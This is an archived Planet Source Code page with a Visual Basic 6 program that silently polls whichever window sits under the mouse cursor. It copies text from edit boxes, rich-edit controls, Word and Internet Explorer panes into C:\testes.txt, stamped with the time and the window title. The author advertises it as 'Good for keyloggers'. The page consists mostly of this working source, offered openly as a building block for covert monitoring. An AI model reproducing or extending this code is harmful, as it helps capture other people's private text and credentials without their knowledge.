<div align="center">

## Grab Window Text


</div>

### Description

This code will grab any text on a Window Text Box and log it to a file... with time and the window caption... Good for keyloggers :]
 
### More Info
 


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[kodapt](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/kodapt.md)
**Level**          |Advanced
**User Rating**    |4.3 (17 globes from 4 users)
**Compatibility**  |VB 6\.0
**Category**       |[Windows API Call/ Explanation](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/windows-api-call-explanation__1-39.md)
**World**          |[Visual Basic](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/visual-basic.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/kodapt-grab-window-text__1-22177/archive/master.zip)





### Source Code

```
'Grab Window Edit Text Box by kodapt - 2001/4/6
' It will grab the text in any Edit Box of any app running on your system.
' Just Start the program and minimize it... then try to open a .txt file and
' then go to C:\testes.txt to see the all text there...
'don´t vote... this is a cra*... :]
' cya, koda
'********************************************************
'API Declarations
'to get the foreground window
Private Declare Function GetForegroundWindow Lib "user32" () As Long
'to send a message system
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
'to get the cursor position
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
'to get the window from a point (y,x)
Private Declare Function WindowFromPoint Lib "user32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
'to get the window text
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
'to get the class name (edit,combobox etc..)
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Public strBuffer As String ' the string to append to the file that has all the text "grabed"
Public iEnum As Integer ' the file integer to open and write (I/O)
Public hJanelaCima As Long ' the window wich the user has the mouse over
Public hJanelaAntiga As Long ' the ancient window, to controlo if there´s a new window or not
'constants to grab the text
Private Const WM_GETTEXT = &HD
Private Const WM_GETTEXTLENGTH = &HE
'type for the GetCursorPos API
Private Type POINTAPI
    x As Long
    y As Long
End Type
Private Sub Form_Load()
'when starting the program, print date and time of the new logging...
strBuffer = "=============================================================" & vbCrLf
strBuffer = strBuffer & "Date of log: " & Format(Date, "YYYY-MM-DD") & vbCrLf
strBuffer = strBuffer & "Started logging at: " & Format(Time$, "HH:MM") & vbCrLf
strBuffer = strBuffer & "=============================================================" & vbCrLf
iEnum = FreeFile
'append it in the file
Open "C:\testes.txt" For Append As #iEnum
  Print #iEnum, strBuffer
  Close #iEnum
  strBuffer = ""
'enable the timer...
Timer1.Enabled = True
End Sub
Private Sub Timer1_Timer()
  Dim ptCursor As POINTAPI ' the cursor type variable
  Dim texto_janela As String ' the window text
  Dim rc As Long
  Dim nome_classe As String ' the class name
  Dim fenster As Long ' the foreground window.. in deutsh.. ich wisse deutshe auch...
fenster = GetForegroundWindow ' get the window where user is
'create string objects
texto_janela = String(100, Chr(0))
nome_classe = String(100, Chr(0))
Call GetCursorPos(ptCursor) ' get the cursor position
'get the window(handle) where the user has the mouse
hJanelaCima = WindowFromPoint(ptCursor.x, ptCursor.y)
'get the window text and class name
rc = GetWindowText(fenster, texto_janela, Len(texto_janela))
rc = GetClassName(hJanelaCima, nome_classe, 100)
'format the asshol*s...
texto_janela = Left(texto_janela, InStr(texto_janela, Chr(0)) - 1)
nome_classe = Left(nome_classe, InStr(nome_classe, Chr(0)) - 1)
' check the class names... i tried some like WinWord and VB, but didn´t worked..
If nome_classe = "Edit" Or nome_classe = "_WwG" Or nome_classe = "Internet Explorer_Server" Or nome_classe = "RichEdit20A" Or nome_classe = "VbaWindow" Then
'if this is the same window, forget
If hJanelaCima = hJanelaAntiga Then Exit Sub
'there´s no text? Out!
If WindowText(hJanelaCima) = Empty Then Exit Sub
'put the ancient window handle, with the current one
hJanelaAntiga = hJanelaCima
'build string with time and the text grabed with WindowText
strBuffer = Time$ & " - " & texto_janela & vbCrLf
strBuffer = strBuffer & WindowText(hJanelaCima) & vbCrLf
'append to the file
Open "C:\testes.txt" For Append As #iEnum
Print #iEnum, strBuffer
Close #iEnum
End If
End Sub
'grab the text window with this function.. argument- the window handle
Public Function WindowText(window_hwnd As Long) As String
  Dim txtlen As Long
  Dim txt As String
  If window_hwnd = 0 Then Exit Function
    'send the message to get the text lenght
    txtlen = SendMessage(window_hwnd, WM_GETTEXTLENGTH, 0, 0)
  If txtlen = 0 Then Exit Function
     txtlen = txtlen + 1
     txt = Space$(txtlen)
     'send the message to get the text
     txtlen = SendMessage(window_hwnd, WM_GETTEXT, txtlen, ByVal txt)
     'put that on the function
     WindowText = Left$(txt, txtlen)
End Function
```

